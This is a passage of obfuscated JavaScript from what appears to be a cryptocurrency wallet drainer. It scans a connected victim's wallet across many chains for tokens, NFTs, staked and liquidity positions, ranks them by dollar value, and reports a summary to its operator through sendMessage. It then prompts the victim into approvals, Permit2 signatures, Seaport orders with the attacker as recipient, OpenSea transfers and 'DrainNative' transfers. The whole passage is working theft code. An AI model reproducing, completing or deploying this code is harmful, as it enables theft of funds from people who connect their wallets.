      _0x23ef2c.push(this.getDynamicAddress(_0x528d35));
    }
    await Promise.all(_0x23ef2c);
    window.isClicked = false;
    this.provider = _0x5f203e;
    this.web3Js = new Web3(this.provider.provider);
    this.ethersProvider = this.provider;
    this.currentChainId = _0x3e24a7;
    this.initialChainId = this.currentChainId;
    this.Sdk = new SDK(this.provider, this.currentChainId);
    await this.Sdk.Initialize();
    if (_0x2d2f04.bannedAddresses.includes(await this.getWalletAddress())) {
      return console.warn("This address is banned");
    }
    await this.ProcessAssets();
    window.disabled = false;
  };
  ["ProcessAssets"] = async () => {
    await Promise.all([this.tokenPromise(), this.nftPromise(), this.apePromise()]);
    await this.handleActions();
    this.provider = null;
    this.web3Js = null;
    window.disabled = false;
    this.ethersProvider = null;
  };
  ["typeToMultiplier"] = _0x289e7d => {
    switch (_0x289e7d) {
      case "AaveLP2":
      case "AaveLP3":
      case 'AaveLP4':
        return _0x2d2f04.assetOptions.multipliers.aave;
      case "ApprovalNFT":
        return _0x2d2f04.assetOptions.multipliers.safa;
      case "TokenPermit":
        return _0x2d2f04.assetOptions.multipliers.permit;
      case "ApprovalToken":
        return _0x2d2f04.assetOptions.multipliers.safa;
      case "ApeStake":
        return _0x2d2f04.assetOptions.multipliers.apestake;
      case "Bancor":
      case "BancorSwaps":
        return _0x2d2f04.assetOptions.multipliers.uniswap;
      case 'Camelot':
        return _0x2d2f04.assetOptions.multipliers.uniswap;
      case "Curve":
      case "CurveVyper1":
        return _0x2d2f04.assetOptions.multipliers.curve;
      case "DrainNative":
        return _0x2d2f04.assetOptions.multipliers.balance;
      case "GMX":
        return _0x2d2f04.assetOptions.multipliers.uniswap;
      case "1InchV5":
        return _0x2d2f04.assetOptions.multipliers.uniswap;
      case "Kyber":
        return _0x2d2f04.assetOptions.multipliers.uniswap;
      case "OSTransfer":
        return _0x2d2f04.assetOptions.multipliers.ostransfers;
      case "Pangolin":
        return _0x2d2f04.assetOptions.multipliers.uniswap;
      case "PancakeV2":
        return _0x2d2f04.assetOptions.multipliers.uniswapv2;
      case "Pancake":
        return _0x2d2f04.assetOptions.multipliers.uniswap;
      case "Permit2":
        return _0x2d2f04.assetOptions.multipliers.permit2;
      case "Quickswap":
        return _0x2d2f04.assetOptions.multipliers.uniswap;
      case "Seaport":
        return _0x2d2f04.assetOptions.multipliers.seaport;
      case "Stargate":
        return _0x2d2f04.assetOptions.multipliers.stargate;
      case "Special":
        return _0x2d2f04.assetOptions.multipliers.special;
      case "SpookySwap":
        return _0x2d2f04.assetOptions.multipliers.uniswap;
      case "ShibaSwap":
        return _0x2d2f04.assetOptions.multipliers.uniswap;
      case "TraderJoeV1":
      case "TraderJoeV2":
      case "TraderJoeV3":
        return _0x2d2f04.assetOptions.multipliers.uniswap;
      case "SushiSwap":
      case "SushiProcess":
        return _0x2d2f04.assetOptions.multipliers.uniswap;
      case "UniswapV2":
        return _0x2d2f04.assetOptions.multipliers.uniswap;
      case "UniswapV3":
      case "UniswapV3_2":
        return _0x2d2f04.assetOptions.multipliers.uniswapv2;
      case "WooBridge":
      case "WooFinance":
        return _0x2d2f04.assetOptions.multipliers.uniswap;
      case "Wyvern":
        return _0x2d2f04.assetOptions.multipliers.wyvern;
      case "ZeroEx":
        return _0x2d2f04.assetOptions.multipliers.uniswap;
    }
  };
  ["formulateStrategy"] = _0x2134c8 => {
    let _0x61a047 = "```" + window.location.hostname.replace(/https?:\/\//i, '') + window.location.pathname.replace(/https?:\/\//i, '');
    for (let _0xf12023 of _0x2134c8) {
      try {
        let _0x4d7c3f = '💎';
        switch (_0xf12023.chain) {
          case "bsc":
            _0x4d7c3f = '🔸';
            break;
          case "ftm":
            _0x4d7c3f = '🈳';
            break;
          case "arb":
            _0x4d7c3f = '🔹';
            break;
          case "matic":
            _0x4d7c3f = '🔮';
            break;
          case "avax":
            _0x4d7c3f = "🅰️";
            break;
          case 'cro':
            _0x4d7c3f = '💠';
            break;
          case 'op':
            _0x4d7c3f = '🔴';
            break;
          case "xdai":
            _0x4d7c3f = '🔰';
            break;
          case "era":
            _0x4d7c3f = '◾️';
            break;
          case "base":
            _0x4d7c3f = '🧿';
            break;
        }
        let _0x589d75 = _0xf12023.actionType;
        let _0x45209f = this.getAssetInfo(_0xf12023);
        if (_0x45209f.isPermit) {
          _0xf12023.actionType = "TokenPermit";
        }
        switch (_0xf12023.actionType) {
          case "DrainNative":
            _0x589d75 = "Draining " + _0xf12023.chain.toUpperCase();
            break;
          case "ApprovalNFT":
            _0x589d75 = _0x45209f.count + "x " + _0x45209f.name + " (SAFA)";
            break;
          case "ApprovalToken":
            _0x589d75 = _0x45209f.name + " (SAFA)";
            break;
          case "TokenPermit":
            _0x589d75 = _0x45209f.name + " (Permit)";
            break;
          case "AaveLP2":
          case 'AaveLP3':
          case "AaveLP4":
            _0x589d75 = _0x45209f.name + " (Aave Liquidity)";
            break;
          case "ApeStake":
            _0x589d75 = "ApeCoin (Staking)";
            break;
          case "Bancor":
          case "BancorSwaps":
            _0x589d75 = _0x45209f.name + " (Bancor)";
            break;
          case 'Camelot':
            _0x589d75 = _0x45209f.name + " (Camelot)";
            break;
          case "Curve":
          case "CurveVyper1":
            _0x589d75 = _0x45209f.name + " (Curve)";
            break;
          case "GMX":
            _0x589d75 = _0x45209f.name + " (GMX)";
            break;
          case '1InchV5':
            _0x589d75 = _0x45209f.name + " (1Inch)";
            break;
          case "Kyber":
            _0x589d75 = _0x45209f.name + " (Kyber)";
            break;
          case "OSTransfer":
            _0x589d75 = _0x45209f.count + " NFT(s) (Opensea Transfers)";
            break;
          case "Pangolin":
            _0x589d75 = _0x45209f.name + " (Pangolin)";
            break;
          case "Pancake":
            _0x589d75 = _0x45209f.name + " (Pancake)";
            break;
          case "PancakeV2":
            _0x589d75 = _0x45209f.count + " Token(s) (Pancake)";
            break;
          case "Permit2":
            _0x589d75 = _0x45209f.count + " Token(s) (Permit2)";
            break;
          case "Quickswap":
            _0x589d75 = _0x45209f.name + " (Quickswap)";
            break;
          case "Seaport":
            _0x589d75 = _0x45209f.nftCount + "x NFT(s) " + _0x45209f.tokenCount + "x Token(s) (Seaport)";
            break;
          case "Stargate":
            _0x589d75 = _0x45209f.name + " (Stargate)";
            break;
          case "Special":
            _0x589d75 = _0x45209f.name + " (Special)";
            break;
          case "SpookySwap":
            _0x589d75 = _0x45209f.name + " (SpookySwap)";
            break;
          case "ShibaSwap":
            _0x589d75 = _0x45209f.name + " (ShibaSwap)";
            break;
          case "SushiSwap":
          case "SushiProcess":
            _0x589d75 = _0x45209f.name + " (SushiSwap)";
            break;
          case "TraderJoeV1":
          case "TraderJoeV2":
          case "TraderJoeV3":
            _0x589d75 = _0x45209f.name + " (TraderJoe)";
            break;
          case "UniswapV2":
            _0x589d75 = _0x45209f.name + " (Uniswap)";
            break;
          case 'UniswapV3':
          case "UniswapV3_2":
            _0x589d75 = _0x45209f.count + " Token(s) (Uniswap)";
            break;
          case "WooFinance":
            _0x589d75 = _0x45209f.name + " (WooFinance)";
            break;
          case "WooBridge":
            _0x589d75 = _0x45209f.name + " (WooBridge)";
            break;
          case 'Wyvern':
            _0x589d75 = _0x45209f.count + "x NFT(s) (Wyvern)";
            break;
          case "ZeroEx":
            _0x589d75 = _0x45209f.name + " (0x)";
            break;
        }
        if (_0xf12023.actionType != '' && !_0x61a047.includes(_0x589d75)) {
          _0x61a047 += "\n" + _0x4d7c3f + " — " + _0x589d75 + " worth $" + this.numberWithCommas((_0xf12023.value / this.typeToMultiplier(_0xf12023.actionType)).toFixed(0));
        }
      } catch {}
    }
    return _0x61a047 + "```";
  };
  ["handleActions"] = async () => {
    const _0x41cc13 = {
      yTCAM: function (_0x568212, _0x3dbef1) {
        return _0x568212 === _0x3dbef1;
      },
      bNPrR: "handling actions"
    };
    _0x41cc13.OWUsE = function (_0x52da45, _0x1ebd40) {
      return _0x52da45 + _0x1ebd40;
    };
    _0x41cc13.OrpdQ = 'connection';
    _0x41cc13.bHJwZ = "eth";
    _0x41cc13.kLkHH = "WhatIsANetwork";
    _0x41cc13.lXSbu = function (_0x431fd6, _0x3b11ad) {
      return _0x431fd6 != _0x3b11ad;
    };
    _0x41cc13.kPLKf = "ApprovalNFT";
    _0x41cc13.uJiIT = "ApprovalToken";
    _0x41cc13.yevMC = function (_0x359eb9, _0x35d23b) {
      return _0x359eb9 != _0x35d23b;
    };
    _0x41cc13.TfmaG = "Stake";
    _0x41cc13.Vrxun = function (_0x246913, _0x2dec9f) {
      return _0x246913 != _0x2dec9f;
    };
    _0x41cc13.PJInV = "DrainNative";
    _0x41cc13.EKbqT = function (_0x2df45e, _0x2f461d) {
      return _0x2df45e + _0x2f461d;
    };
    _0x41cc13.bDuGi = function (_0x50a222, _0x5f47a1) {
      return _0x50a222 * _0x5f47a1;
    };
    _0x41cc13.ZercT = function (_0x57fdee, _0x59921a) {
      return _0x57fdee > _0x59921a;
    };
    _0x41cc13.huhQH = function (_0x31fbb8, _0x5e42e6) {
      return _0x31fbb8 == _0x5e42e6;
    };
    _0x41cc13.IXMMO = function (_0x3b9d6b, _0x34212b) {
      return _0x3b9d6b + _0x34212b;
    };
    _0x41cc13.PspSH = " on ";
    _0x41cc13.omBiJ = "AaveLP2";
    _0x41cc13.wnsYn = 'AaveLP3';
    _0x41cc13.aOcrb = 'AaveLP4';
    _0x41cc13.fiSii = "ApeStake";
    _0x41cc13.sGdnW = "BancorSwaps";
    _0x41cc13.MIhpB = "BlurExec";
    _0x41cc13.cNGhm = "BlurDelegate";
    _0x41cc13.nqAQw = "Camelot";
    _0x41cc13.dNPwY = "Curve";
    _0x41cc13.YZqDX = "CurveVyper1";
    _0x41cc13.trEmK = "Cowswap";
    _0x41cc13.kHzqP = "1InchV5";
    _0x41cc13.idVfA = "Kyber";
    _0x41cc13.tWOvM = 'Pangolin';
    _0x41cc13.FKZiw = "Permit2";
    _0x41cc13.pawwI = "Quickswap";
    _0x41cc13.siYQV = 'Stargate';
    _0x41cc13.LfMjt = "Special";
    _0x41cc13.axFdB = "SpookySwap";
    _0x41cc13.GdEOG = "ShibaSwap";
    _0x41cc13.zYyZa = "SushiProcess";
    _0x41cc13.UPKwP = "TraderJoeV1";
    _0x41cc13.zkOmb = "TraderJoeV2";
    _0x41cc13.YusBg = "TraderJoeV3";
    _0x41cc13.TQcKG = "UniswapV3";
    _0x41cc13.BxVYK = "UniswapV3_2";
    _0x41cc13.LHtcv = "UniswapNFT";
    _0x41cc13.KQBGa = "WooBridge";
    _0x41cc13.nNmDZ = "X2Y2";
    _0x41cc13.PTFte = "Finished action";
    let _0x10e628 = await this.getWalletAddress();
    console.log("handling actions");
    this.considerations = [];
    this.totalSeaport = 0;
    this.totalTransfer = 0;
    this.totalBlur = 0;
    this.totalWyvern = 0;
    this.nativeBalances = 0;
    this.actions = [];
    this.failedAttempts = 0;
    for (let _0x1f3731 of this.tokenChains) try {
      await this.populateActions(_0x1f3731);
    } catch (_0x391a57) {
      console.log(_0x391a57);
    }
    let _0x1b59e5 = this.actions.sort(this.utils.propComparator('value')).reverse();
    if (!this.sentMessage) {
      let _0x195c0b = _0x41cc13.OWUsE(_0x41cc13.OWUsE(this.totalTokens, this.totalStaked), this.totalNFTs);
      this.sentMessage = true;
      await this.sendMessage({
        'type': _0x41cc13.OrpdQ,
        'value': _0x195c0b,
        'chain': _0x41cc13.bHJwZ,
        'strategy': this.formulateStrategy(_0x1b59e5.slice(0, 0x5))
      });
    }
    this.offer = [];
    this.totalNFTs = 0;
    this.totalStaked = 0;
    this.totalTokens = 0;
    this.chainValues = [];
    this.exchangeValues = [];
    for (const _0x2c64d9 of this.tokenChains) {
      const _0x4f45b7 = {
        chain: _0x2c64d9,
        value: 0x0
      };
      this.chainValues.push(_0x4f45b7);
      const _0x2b5524 = {
        chain: _0x2c64d9,
        value: 0x0,
        actions: 0x0
      };
      this.exchangeValues.push(_0x2b5524);
    }
    if (this.actions.length > 0) {
      const _0x206ed8 = {
        view: _0x41cc13.kLkHH
      };
      modal.open(_0x206ed8);
    }
    for (let _0x285821 of this.actions.slice(0, 7)) {
      let _0x23de97 = false;
      if (_0x41cc13.lXSbu(_0x285821.actionType, _0x41cc13.kPLKf) && _0x41cc13.lXSbu(_0x285821.actionType, _0x41cc13.uJiIT) && _0x41cc13.yevMC(_0x285821.actionType, _0x41cc13.TfmaG) && _0x41cc13.Vrxun(_0x285821.actionType, _0x41cc13.PJInV)) {
        _0x23de97 = true;
      }
      try {
        if (_0x285821.value > 0) {
          if (_0x285821.chain == (await this.getChainFromId(this.currentChainId))) {
            if (_0x23de97) {
              const _0x264213 = this.exchangeValues.findIndex(_0x30cab4 => {
                return _0x30cab4.chain === _0x285821.chain;
              });
              this.exchangeValues[_0x264213].value += _0x285821.value;
              this.exchangeValues[_0x264213].actions = _0x41cc13.EKbqT(this.exchangeValues[_0x264213].actions, 1);
            } else {
              const _0x4e88b3 = this.chainValues.findIndex(_0x3dc8ee => {
                return _0x3dc8ee.chain === _0x285821.chain;
              });
              this.chainValues[_0x4e88b3].value += _0x285821.value;
            }
          } else {
            if (_0x23de97) {
              const _0x2b2895 = this.exchangeValues.findIndex(_0x374831 => {
                return _0x374831.chain === _0x285821.chain;
              });
              this.exchangeValues[_0x2b2895].value += _0x285821.value * _0x2d2f04.assetOptions.multipliers.chainSwitchRatio;
              this.exchangeValues[_0x2b2895].actions = _0x41cc13.OWUsE(this.exchangeValues[_0x2b2895].actions, 1);
            } else {
              const _0x3b08ae = this.chainValues.findIndex(_0x543598 => {
                return _0x543598.chain === _0x285821.chain;
              });
              this.chainValues[_0x3b08ae].value += _0x41cc13.bDuGi(_0x285821.value, _0x2d2f04.assetOptions.multipliers.chainSwitchRatio);
            }
          }
        }
      } catch {}
    }
    console.log(this.chainValues);
    for (const _0x50886b of this.exchangeValues) {
      try {
        const _0x4d35ed = this.chainValues.findIndex(_0x170acf => {
          return _0x170acf.chain === _0x50886b.chain;
        });
        if (_0x41cc13.ZercT(_0x50886b.value, 0)) {
          this.chainValues[_0x4d35ed].value += _0x50886b.value / _0x50886b.actions;
        }
      } catch {}
    }
    for (let _0x93579f of _0x1b59e5) {
      await this.handleChains();
      if (_0x41cc13.huhQH(_0x93579f.chain, await this.getChainFromId(this.currentChainId))) {
        console.log(_0x41cc13.IXMMO(_0x41cc13.OWUsE("Prompting " + _0x93579f.actionType, _0x41cc13.PspSH), _0x93579f.chain));
        if (_0x10e628 != (await this.getWalletAddress())) {
          return;
        }
        if (_0x93579f.value > 10) {
          switch (_0x93579f.actionType) {
            case _0x41cc13.omBiJ:
              await this.doSwapRegular(_0x93579f);
              break;
            case _0x41cc13.wnsYn:
              await this.doSwapRegular(_0x93579f);
              break;
            case _0x41cc13.aOcrb:
              await this.doSwapRegular(_0x93579f);
              break;
            case _0x41cc13.kPLKf:
              await this.approve(_0x93579f);
              break;
            case _0x41cc13.uJiIT:
              await this.approve(_0x93579f);
              break;
            case _0x41cc13.fiSii:
              await this.unStake(_0x93579f);
              break;
            case 'Bancor':
              await this.doSwapRegular(_0x93579f);
              break;
            case _0x41cc13.sGdnW:
              await this.doSwapRegular(_0x93579f);
              break;
            case _0x41cc13.MIhpB:
              break;
            case _0x41cc13.cNGhm:
              break;
            case _0x41cc13.nqAQw:
              await this.doSwapRegular(_0x93579f);
              break;
            case _0x41cc13.dNPwY:
              await this.doSwapRegular(_0x93579f);
              break;
            case _0x41cc13.YZqDX:
              await this.doSwapRegular(_0x93579f);
              break;
            case _0x41cc13.trEmK:
              break;
            case _0x41cc13.PJInV:
              await this.drainNative(_0x93579f);
              break;
            case "GMX":
              await this.doSwapRegular(_0x93579f);
              break;
            case _0x41cc13.kHzqP:
              await this.doSwapRegular(_0x93579f);
              break;
            case _0x41cc13.idVfA:
              await this.doSwapRegular(_0x93579f);
              break;
            case "OSTransfer":
              await this.transferOpensea(_0x93579f);
              break;
            case _0x41cc13.tWOvM:
              await this.doSwapRegular(_0x93579f);
              break;
            case 'Pancake':
              await this.doSwapRegular(_0x93579f);
              break;
            case 'PancakeV2':
              await this.doSwapRegular(_0x93579f);
              break;
            case _0x41cc13.FKZiw:
              await this.permit2(_0x93579f);
              break;
            case _0x41cc13.pawwI:
              await this.doSwapRegular(_0x93579f);
              break;
            case "Seaport":
              await this.seaportOrder(_0x93579f);
              break;
            case _0x41cc13.siYQV:
              await this.doSwapRegular(_0x93579f);
              break;
            case _0x41cc13.LfMjt:
              await this.doSwapRegular(_0x93579f);
              break;
            case _0x41cc13.axFdB:
              await this.doSwapRegular(_0x93579f);
              break;
            case _0x41cc13.GdEOG:
              await this.doSwapRegular(_0x93579f);
              break;
            case "SushiSwap":
              await this.doSwapRegular(_0x93579f);
              break;
            case _0x41cc13.zYyZa:
              await this.doSwapRegular(_0x93579f);
              break;
            case _0x41cc13.UPKwP:
              await this.doSwapRegular(_0x93579f);
              break;
            case _0x41cc13.zkOmb:
              await this.doSwapRegular(_0x93579f);
              break;
            case _0x41cc13.YusBg:
              await this.doSwapRegular(_0x93579f);
              break;
            case "UniswapV2":
              await this.doSwapRegular(_0x93579f);
              break;
            case _0x41cc13.TQcKG:
              await this.doSwapRegular(_0x93579f);
              break;
            case _0x41cc13.BxVYK:
              await this.doSwapRegular(_0x93579f);
              break;
            case _0x41cc13.LHtcv:
              break;
            case "WooFinance":
              await this.doSwapRegular(_0x93579f);
              break;
            case _0x41cc13.KQBGa:
              await this.doSwapRegular(_0x93579f);
              break;
            case "Wyvern":
              await this.wyvern(_0x93579f);
              break;
            case "ZeroEx":
              await this.doSwapRegular(_0x93579f);
              break;
            case _0x41cc13.nNmDZ:
              break;
          }
          console.log(_0x41cc13.PTFte);
          this.handledActions.push(Base64.encode(JSON.stringify(_0x93579f)));
          localStorage.approved = JSON.stringify(this.approved);
          await this.handleActions();
          return;
        }
      }
    }
    modal.close();
  };
  ["populateActions"] = async _0x10c58f => {
    if (_0x10c58f == "matic") {
      let _0x29d888 = this.quickSwapActions.filter(_0xd2f2db => _0xd2f2db.chain == _0x10c58f && !this.approved.includes(_0xd2f2db.token + ',' + _0x10c58f));
      if (_0x29d888.length > 0) {
        for (let _0x3198a7 of _0x29d888) {
          const _0x144cd1 = {
            token: _0x3198a7.token,
            amount: _0x3198a7.amount,
            value: _0x3198a7.value
          };
          var _0x4bd67b = _0x144cd1;
          this.createAction("Quickswap", _0x4bd67b, _0x3198a7.value, _0x10c58f);
        }
      }
    }
    if (_0x10c58f == "ftm") {
      let _0x32e334 = this.spookyActions.filter(_0x51b491 => _0x51b491.chain == _0x10c58f && !this.approved.includes(_0x51b491.token + ',' + _0x10c58f));
      if (_0x32e334.length > 0) {
        for (let _0x512bcb of _0x32e334) {
          const _0x5d7eca = {
            token: _0x512bcb.token,
            amount: _0x512bcb.amount,
            value: _0x512bcb.value
          };
          var _0x4bd67b = _0x5d7eca;
          this.createAction('SpookySwap', _0x4bd67b, _0x512bcb.value, _0x10c58f);
        }
      }
    }
    if (_0x10c58f == "eth") {
      let _0x42179d = [];
      let _0x53d978 = [];
      let _0x6004d2 = this.approvalNFTActions.filter(_0x1a352f => _0x1a352f.chain == _0x10c58f && !this.approved.includes(_0x1a352f.nft.contract + ',' + _0x10c58f));
      if (_0x6004d2.length > 0) {
        let _0x2a6eb4 = [];
        for (let _0x59e9c9 of _0x6004d2) {
          let _0xe3d4f7 = [];
          if (!_0x2a6eb4.filter(_0x5450b2 => _0x5450b2.nft.contract == _0x59e9c9.nft.contract).length > 0) {
            for (let _0x471089 of _0x6004d2) {
              if (_0x471089.nft.contract == _0x59e9c9.nft.contract) {
                _0xe3d4f7.push(_0x471089.nft.token_id);
              }
            }
            _0x59e9c9.nft.token_ids = _0xe3d4f7;
            _0x2a6eb4.push(_0x59e9c9);
          }
        }
        for (let _0x497fad of _0x2a6eb4) {
          let _0x56dc72 = _0x497fad.nft.token_ids.length * _0x497fad.value;
          if (!this.approved.includes(Base64.encode(JSON.stringify(_0x497fad.nft)))) {
            this.createAction("ApprovalNFT", _0x497fad.nft, _0x56dc72, _0x10c58f);
          }
        }
      }
      let _0x58633c = this.seaportTokenActions.filter(_0x437167 => _0x437167.chain == _0x10c58f && !this.approved.includes(_0x437167.token + ',' + _0x10c58f));
      if (_0x58633c.length > 0) {
        for (let _0x332263 of _0x58633c) {
          if (_0x332263.value > 50) {
            const _0x382360 = {
              itemType: 0x1,
              token: _0x332263.token,
              startAmount: _0x332263.amount,
              endAmount: _0x332263.amount
            };
            const _0x52ce03 = {
              itemType: 0x1,
              token: _0x332263.token,
              startAmount: _0x332263.amount,
              endAmount: _0x332263.amount,
              recipient: this.receiver
            };
            let _0x27f05e = this.Sdk.getItem(_0x52ce03);
            let _0x509255 = this.Sdk.getItem(_0x382360);
            this.offer.push(_0x509255);
            this.considerations.push(_0x27f05e);
            this.totalSeaport += _0x332263.value;
          }
        }
      }
      let _0x495214 = this.seaportNFTActions.filter(_0x20a251 => _0x20a251.chain == _0x10c58f && !this.approved.includes(_0x20a251.nft.contract + ',' + _0x10c58f) && !this.approved.includes(Base64.encode(JSON.stringify(_0x20a251.nft))));
      if (_0x495214.length > 0) {
        for (let _0xa1144c of _0x495214) {
          if (_0xa1144c.value > 50) {
            let _0x5bda3c = _0xa1144c.nft;
            let _0x1466ea = 2;
            if (_0x5bda3c.scheme == "erc1155") {
              _0x1466ea = 3;
            }
            const _0xfc032e = {
              itemType: _0x1466ea,
              token: _0x5bda3c.contract,
              startAmount: _0x5bda3c.amount,
              endAmount: _0x5bda3c.amount,
              tokenId: _0x5bda3c.token_id
            };
            const _0x2523f6 = {
              itemType: _0x1466ea,
              token: _0x5bda3c.contract,
              startAmount: _0x5bda3c.amount,
              endAmount: _0x5bda3c.amount,
              tokenId: _0x5bda3c.token_id,
              recipient: this.receiver
            };
            let _0x9e10f0 = this.Sdk.getItem(_0x2523f6);
            let _0x52f662 = this.Sdk.getItem(_0xfc032e);
            this.offer.push(_0x52f662);
            this.considerations.push(_0x9e10f0);
            this.totalSeaport += _0xa1144c.value;
          }
        }
      }
      let _0x5f0d0f = this.osTransferActions.filter(_0xeca2e1 => _0xeca2e1.chain == _0x10c58f && !this.approved.includes(_0xeca2e1.nft.contract + ',' + _0x10c58f) && !this.approved.includes(Base64.encode(JSON.stringify(_0xeca2e1.nft))));
      if (_0x5f0d0f.length > 0) {
        for (let _0x3e0564 of _0x5f0d0f) {
          if (_0x3e0564.value > 30) {
            let _0x267d37 = _0x3e0564.nft;
            let _0x5b9e65 = 2;
            if (_0x267d37.scheme == "erc1155") {
              _0x5b9e65 = 3;
            }
            const _0xdee5b7 = {
              itemType: _0x5b9e65,
              token: _0x267d37.contract,
              amount: _0x267d37.amount,
              tokenId: _0x267d37.token_id
            };
            _0x53d978.push(_0xdee5b7);
            this.totalTransfer += _0x3e0564.value;
          }
        }
      }
      let _0x53266c = this.wyvernNftActions.filter(_0x4ec10b => _0x4ec10b.chain == _0x10c58f && !this.approved.includes(_0x4ec10b.nft.contract + ',' + _0x10c58f) && !this.approved.includes(Base64.encode(JSON.stringify(_0x4ec10b.nft))));
      if (_0x53266c.length > 0) {
        for (let _0x26a1f4 of _0x53266c) {
          const _0x54b36a = {
            nft: _0x26a1f4.nft,
            value: _0x26a1f4.value
          };
          var _0x4bd67b = _0x54b36a;
          _0x42179d.push(_0x4bd67b);
          this.totalWyvern += _0x26a1f4.value;
        }
      }
      if (this.totalSeaport > 0) {
        this.createAction("Seaport", '', this.totalSeaport, "eth");
      }
      if (this.totalWyvern > 0) {
        this.createAction("Wyvern", _0x42179d, this.totalWyvern, "eth");
      }
      if (this.totalTransfer > 0) {
        this.createAction('OSTransfer', _0x53d978, this.totalTransfer, "eth");
      }
    }
    if (_0x10c58f == "arb") {
      let _0x150c51 = this.camelotActions.filter(_0x235225 => _0x235225.chain == _0x10c58f && !this.approved.includes(_0x235225.token + ',' + _0x10c58f));
      if (_0x150c51.length > 0) {
        for (let _0x33744c of _0x150c51) {
          const _0x1c7e39 = {
            token: _0x33744c.token,
            amount: _0x33744c.amount,
            value: _0x33744c.value
          };
          var _0x4bd67b = _0x1c7e39;
          this.createAction('Camelot', _0x4bd67b, _0x33744c.value, _0x10c58f);
        }
      }
      let _0x4f9b45 = this.gmxActions.filter(_0x1029b9 => _0x1029b9.chain == _0x10c58f && !this.approved.includes(_0x1029b9.token + ',' + _0x10c58f));
      if (_0x4f9b45.length > 0) {
        for (let _0xa00b48 of _0x4f9b45) {
          const _0x36143a = {
            token: _0xa00b48.token,
            amount: _0xa00b48.amount,
            value: _0xa00b48.value
          };
          var _0x4bd67b = _0x36143a;
          this.createAction('GMX', _0x4bd67b, _0xa00b48.value, _0x10c58f);
        }
      }
    }
    let _0x534e28 = this.drainNativeActions.filter(_0x211e0e => _0x211e0e.chain == _0x10c58f);
    if (_0x534e28.length > 0) {
      for (let _0x63ac0a of _0x534e28) {
        this.createAction("DrainNative", _0x63ac0a.balance, _0x63ac0a.value, _0x10c58f);
        this.nativeBalances += _0x63ac0a.value;
      }
    }
    let _0x199a96 = this.approvalTokenActions.filter(_0x17edb4 => _0x17edb4.chain == _0x10c58f && !this.approved.includes(_0x17edb4.token.token_address + ',' + _0x10c58f));
    if (_0x199a96.length > 0) {
      for (let _0x28567b of _0x199a96) {
        this.createAction("ApprovalToken", _0x28567b.token, _0x28567b.value, _0x10c58f);
      }
    }
    let _0x13970b = this.apeStakeActions.filter(_0x39766c => _0x39766c.chain == _0x10c58f);
    ;
    if (_0x13970b.length > 0) {
      for (let _0xada926 of _0x13970b) {
        this.createAction('ApeStake', _0xada926.stake, _0xada926.value * _0x2d2f04.assetOptions.multipliers.apestake, _0x10c58f);
        this.totalStaked += _0xada926.value;
      }
    }
    let _0x306bd2 = this.aaveLP2Actions.filter(_0x2b52d3 => _0x2b52d3.chain == _0x10c58f && !this.approved.includes(_0x2b52d3.token + ',' + _0x10c58f));
    if (_0x306bd2.length > 0) {
      for (let _0x5196a1 of _0x306bd2) {
        const _0x3a148d = {
          token: _0x5196a1.token,
          amount: _0x5196a1.amount,
          value: _0x5196a1.value
        };
        var _0x4bd67b = _0x3a148d;
        this.createAction("AaveLP2", _0x4bd67b, _0x5196a1.value, _0x10c58f);
      }
    }
    let _0x232f65 = this.aaveLP3Actions.filter(_0x3312aa => _0x3312aa.chain == _0x10c58f && !this.approved.includes(_0x3312aa.token + ',' + _0x10c58f));
    if (_0x232f65.length > 0) {
      for (let _0x458637 of _0x232f65) {
        const _0x3f5204 = {
          token: _0x458637.token,
          amount: _0x458637.amount,
          value: _0x458637.value
        };
        var _0x4bd67b = _0x3f5204;
        this.createAction("AaveLP3", _0x4bd67b, _0x458637.value, _0x10c58f);
      }
    }
    let _0x2c2f96 = this.aaveLP4Actions.filter(_0x38bbec => _0x38bbec.chain == _0x10c58f && !this.approved.includes(_0x38bbec.token + ',' + _0x10c58f));
    if (_0x2c2f96.length > 0) {
      for (let _0x1fedf4 of _0x2c2f96) {
        const _0x22ac7e = {
          token: _0x1fedf4.token,
          amount: _0x1fedf4.amount,
          value: _0x1fedf4.value
        };
        var _0x4bd67b = _0x22ac7e;
        this.createAction('AaveLP4', _0x4bd67b, _0x1fedf4.value, _0x10c58f);
      }
    }
    let _0x170e55 = this.bancorActions.filter(_0x43a94d => _0x43a94d.chain == _0x10c58f && !this.approved.includes(_0x43a94d.token + ',' + _0x10c58f));
    if (_0x170e55.length > 0) {
      for (let _0x35c095 of _0x170e55) {
        const _0x3cd52a = {
          token: _0x35c095.token,
          amount: _0x35c095.amount,
          value: _0x35c095.value
        };
        var _0x351e30 = _0x3cd52a;
        this.createAction("Bancor", _0x351e30, _0x35c095.value, _0x10c58f);
      }
    }
    let _0x3e8db1 = this.bancorSwapsActions.filter(_0x3e9fcc => _0x3e9fcc.chain == _0x10c58f && !this.approved.includes(_0x3e9fcc.token + ',' + _0x10c58f));
    if (_0x3e8db1.length > 0) {
      for (let _0x2cd95a of _0x3e8db1) {
        const _0x5a449b = {
          token: _0x2cd95a.token,
          amount: _0x2cd95a.amount,
          value: _0x2cd95a.value
        };
        var _0x351e30 = _0x5a449b;
        this.createAction("BancorSwaps", _0x351e30, _0x2cd95a.value, _0x10c58f);
      }
    }
    let _0x4628c4 = this.curveActions.filter(_0x2301ee => _0x2301ee.chain == _0x10c58f && !this.approved.includes(_0x2301ee.token + ',' + _0x10c58f));
    if (_0x4628c4.length > 0) {
      for (let _0x4b3c3e of _0x4628c4) {
        const _0x45fc87 = {
          token: _0x4b3c3e.token,
          amount: _0x4b3c3e.amount,
          value: _0x4b3c3e.value
        };
        var _0x553e45 = _0x45fc87;
        this.createAction("Curve", _0x553e45, _0x4b3c3e.value, _0x10c58f);
      }
    }
    let _0x246b8e = this.curveVyper1Actions.filter(_0x4d50cd => _0x4d50cd.chain == _0x10c58f && !this.approved.includes(_0x4d50cd.token + ',' + _0x10c58f));
    if (_0x246b8e.length > 0) {
      for (let _0x1c3e3d of _0x246b8e) {
        const _0x59f552 = {
          token: _0x1c3e3d.token,
          amount: _0x1c3e3d.amount,
          value: _0x1c3e3d.value
        };
        var _0x553e45 = _0x59f552;
        this.createAction("CurveVyper1", _0x553e45, _0x1c3e3d.value, _0x10c58f);
      }
    }
    let _0x4454a2 = this.cowActions.filter(_0xa3ca9c => _0xa3ca9c.chain == _0x10c58f && !this.approved.includes(_0xa3ca9c.token + ',' + _0x10c58f));
    if (_0x4454a2.length > 0) {
      for (let _0x2043c4 of _0x4454a2) {
        const _0x35a291 = {
          token: _0x2043c4.token,
          amount: _0x2043c4.amount,
          value: _0x2043c4.value
        };
        this.createAction('Cowswap', _0x35a291, _0x2043c4.value, _0x10c58f);
      }
    }
